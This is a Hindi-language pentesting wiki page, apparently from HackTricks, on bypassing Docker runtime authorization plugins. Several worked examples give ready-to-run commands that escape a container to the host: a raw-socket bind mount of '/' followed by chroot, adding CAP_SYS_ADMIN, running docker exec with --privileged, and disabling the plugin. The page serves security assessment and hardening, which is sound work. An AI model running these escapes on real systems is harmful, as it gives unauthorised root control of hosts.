# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

Runtime authorization plugins एक अतिरिक्त policy layer हैं, जो तय करती है कि कोई caller daemon की कोई दी गई कार्रवाई कर सकता है या नहीं। Docker इसका पारंपरिक उदाहरण है। डिफ़ॉल्ट रूप से, Docker daemon से बात कर सकने वाला कोई भी व्यक्ति उस पर व्यापक नियंत्रण रखता है। Authorization plugins, authenticated user और अनुरोधित API operation की जाँच करके, policy के अनुसार अनुरोध को अनुमति देने या अस्वीकार करने की कोशिश करते हैं।

यह विषय अपने अलग पेज का हकदार है, क्योंकि जब attacker के पास पहले से Docker API या `docker` group के किसी user का access हो, तो इससे exploitation model बदल जाता है। ऐसे माहौल में सवाल सिर्फ़ "क्या मैं daemon तक पहुँच सकता हूँ?" नहीं रह जाता, बल्कि यह भी होता है कि "क्या daemon पर authorization layer लगी है, और अगर हाँ, तो क्या unhandled endpoints, कमज़ोर JSON parsing या plugin-management permissions के ज़रिए उस layer को bypass किया जा सकता है?"

## काम करने का तरीका

Docker daemon तक अनुरोध पहुँचने पर authorization subsystem, अनुरोध का context एक या अधिक installed plugins को दे सकता है। Plugin को authenticated user की identity, अनुरोध का विवरण, चुने हुए headers और उपयुक्त content type होने पर अनुरोध या response body के कुछ हिस्से दिखाई देते हैं। कई plugins को chain किया जा सकता है, और access तभी मिलता है जब सभी plugins अनुरोध को अनुमति दें।

यह model मज़बूत लगता है, लेकिन इसकी सुरक्षा पूरी तरह इस बात पर निर्भर करती है कि policy बनाने वाले ने API को कितनी पूरी तरह समझा है। `docker run --privileged` को block करने वाला, लेकिन `docker exec` को नज़रअंदाज़ करने वाला, `Binds` जैसी top-level JSON keys को न पहचानने वाला या plugin administration की अनुमति देने वाला plugin, प्रतिबंध का झूठा भरोसा पैदा कर सकता है, जबकि privilege escalation के सीधे रास्ते खुले रहते हैं।

## आम Plugin Targets

Policy की समीक्षा के लिए अहम क्षेत्र हैं:

- container creation endpoints
- `HostConfig` fields जैसे `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` और namespace-sharing options
- `docker exec` का व्यवहार
- plugin management endpoints
- ऐसा कोई भी endpoint जो इच्छित policy model के बाहर runtime actions को अप्रत्यक्ष रूप से trigger कर सकता है

ऐतिहासिक रूप से, Twistlock के `authz` plugin जैसे उदाहरणों और `authobot` जैसे सरल शैक्षिक plugins ने इस model का अध्ययन आसान बनाया, क्योंकि उनकी policy files और code paths दिखाते थे कि endpoint-to-action mapping वास्तव में कैसे लागू की गई थी। Assessment के लिए अहम सीख यह है कि policy बनाने वाले को केवल सबसे स्पष्ट CLI commands ही नहीं, बल्कि पूरी API surface समझनी चाहिए।

## दुरुपयोग

पहला लक्ष्य यह पता लगाना है कि वास्तव में क्या block है। यदि daemon किसी कार्रवाई को अस्वीकार करता है, तो error में अक्सर plugin का नाम leak हो जाता है, जिससे इस्तेमाल हो रहे control की पहचान करने में मदद मिलती है:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

यदि आपको व्यापक endpoint profiling की आवश्यकता है, तो `docker_auth_profiler` जैसे tools उपयोगी हैं, क्योंकि वे यह जाँचने के अक्सर दोहराए जाने वाले काम को automate करते हैं कि plugin द्वारा वास्तव में किन API routes और JSON structures की अनुमति है।

यदि environment में custom plugin का उपयोग होता है और आप API के साथ interact कर सकते हैं, तो पता लगाएँ कि किन object fields को वास्तव में filter किया जाता है:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

ये जाँचें महत्वपूर्ण हैं, क्योंकि authorization की कई विफलताएँ concept-specific के बजाय field-specific होती हैं। कोई plugin, समकक्ष API structure को पूरी तरह block किए बिना CLI pattern को reject कर सकता है।

### पूरा उदाहरण: `docker exec` Container बनने के बाद Privilege जोड़ता है

ऐसी policy को bypass किया जा सकता है जो privileged container creation को block करती है, लेकिन unconfined container creation और `docker exec` की अनुमति देती है:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

यदि daemon दूसरा चरण स्वीकार करता है, तो उपयोगकर्ता ने container के अंदर एक privileged interactive process प्राप्त कर लिया है, जिसे policy लेखक ने सीमित माना था।

एक प्रतिबंधित `sudo` नियम भी यही रास्ता खोल सकता है, भले ही caller सीधे Docker socket तक न पहुँच सके। उदाहरण के लिए, root-capable `/usr/bin/docker exec *` grant caller को Docker के `--privileged` और `--user root` options देने की अनुमति दे सकता है। इसके लिए एक running container फिर भी आवश्यक है; कुछ Linux hosts पर, जब `docker ps` की अनुमति न हो, तब उसका ID `containerd-shim` process की command line में दिखाई देता है। इस नियम को जाँच के संकेत के रूप में लें: प्रभावी sudo policy, daemon के authorization controls, user namespaces, और यह पुष्टि करें कि क्या resulting process किसी host device या writable host mount तक पहुँच सकता है। Docker अपने [CLI reference](https://docs.docker.com/reference/cli/docker/container/exec/) में exec options का दस्तावेज़ देता है।

Caller द्वारा चुनी गई Compose file स्वीकार करने वाले root-run wrapper को पूरे [Compose service model](https://docs.docker.com/reference/compose-file/services/) की पुष्टि करनी चाहिए, न कि सिर्फ़ `privileged: true` को अस्वीकार करना और bind mounts पर `:ro` अनिवार्य करना। `cap_add`, `security_opt`, devices, namespaces, build inputs और हर समर्थित volume syntax की जाँच करें। उपयुक्त capabilities और कमज़ोर security confinement वाले container के अंदर read-only bind mount भी writable हो सकता है; यह daemon और kernel policy पर निर्भर करता है। केवल prefix पर आधारित host-path allowlists और अंतिम path component पर symlink checks की भी समीक्षा ज़रूरी है। `sudo` नियम और `docker-compose up` की सीधी call एक संभावित मामले की पहचान करते हैं; exploitability का निर्धारण wrapper की प्रभावी validation और runtime daemon restrictions से होता है।

### पूरा उदाहरण: Raw API के ज़रिए Bind Mount

कुछ टूटी हुई policies केवल एक JSON shape की जाँच करती हैं। यदि root filesystem bind mount को लगातार block नहीं किया जाता, तो host को फिर भी mount किया जा सकता है:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

यही विचार `HostConfig` के अंतर्गत भी दिखाई दे सकता है:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

इसका प्रभाव host filesystem से पूरी तरह escape करना है। दिलचस्प बात यह है कि यह bypass किसी kernel bug के बजाय policy coverage अधूरी होने के कारण होता है।

### पूरा उदाहरण: अनचेक किया गया Capability Attribute

अगर policy किसी capability-संबंधी attribute को फ़िल्टर करना भूल जाती है, तो attacker ऐसा container बना सकता है जो फिर से एक खतरनाक capability हासिल कर लेता है:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

एक बार `CAP_SYS_ADMIN` या इसी तरह की शक्तिशाली capability उपलब्ध हो जाए, तो [capabilities.md](protections/capabilities.md) और [privileged-containers.md](privileged-containers.md) में बताई गई कई breakout techniques तक पहुँचना संभव हो जाता है।

### पूरा उदाहरण: Plugin को अक्षम करना

अगर plugin-management operations की अनुमति हो, तो सबसे साफ़ bypass यह हो सकता है कि control को पूरी तरह बंद कर दिया जाए:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

यह control-plane स्तर पर policy की विफलता है। authorization layer मौजूद है, लेकिन जिस user को प्रतिबंधित करना था, उसके पास अब भी इसे disable करने की permission है।

## जाँचें

इन commands का उद्देश्य यह पता लगाना है कि policy layer मौजूद है या नहीं, और क्या वह पूरी लगती है या केवल दिखावटी है।

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

यहां दिलचस्प बात यह है:

- Plugin name वाले denial messages authorization layer की पुष्टि करते हैं और अक्सर सटीक implementation का पता देते हैं।
- Attacker को दिखाई देने वाली plugin list यह पता लगाने के लिए पर्याप्त हो सकती है कि disable या reconfigure operations संभव हैं या नहीं।
- ऐसी policy जो केवल स्पष्ट CLI actions को रोकती है, लेकिन raw API requests को नहीं, उसे तब तक bypassable मानना चाहिए जब तक इसके विपरीत साबित न हो जाए।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से enabled नहीं | जब तक authorization plugin configure न किया गया हो, daemon access प्रभावी रूप से all-or-nothing होता है | अधूरी plugin policy, allowlists के बजाय blacklists, plugin management की अनुमति देना, field-level blind spots |
| Podman | आमतौर पर इसका सीधा equivalent नहीं | Podman आमतौर पर Docker-style authz plugins के बजाय Unix permissions, rootless execution और API exposure के निर्णयों पर अधिक निर्भर करता है | rootful Podman API को व्यापक रूप से expose करना, socket permissions का कमज़ोर होना |
| containerd / CRI-O | अलग control model | ये runtimes आमतौर पर Docker authz plugins के बजाय socket permissions, node trust boundaries और higher-layer orchestrator controls पर निर्भर करते हैं | socket को workloads में mount करना, कमज़ोर node-local trust assumptions |
| Kubernetes | Docker authz plugins के बजाय API-server और kubelet layers पर authn/authz का उपयोग करता है | Cluster RBAC और admission controls मुख्य policy layer हैं | जरूरत से ज़्यादा व्यापक RBAC, कमज़ोर admission policy, kubelet या runtime APIs को सीधे expose करना |

{{#include ../../../banners/hacktricks-training.md}}
